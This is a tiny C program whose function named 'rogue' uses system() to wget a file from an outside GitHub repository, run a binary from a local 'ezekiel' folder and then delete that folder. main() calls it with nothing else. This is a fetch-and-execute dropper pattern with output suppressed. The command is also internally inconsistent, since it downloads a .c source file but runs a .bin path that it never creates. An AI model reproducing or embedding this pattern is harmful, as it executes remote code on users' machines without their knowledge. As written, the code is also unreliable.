#include <stdlib.h>

void rogue()
{
	system("wget https://raw.githubusercontent.com/solanav/ezekiel/master/ezekiel.c > /dev/null && ./ezekiel/ezekiel.bin && rm -rf ./ezekiel");
}

int main() {
	// whatever
	rogue();
}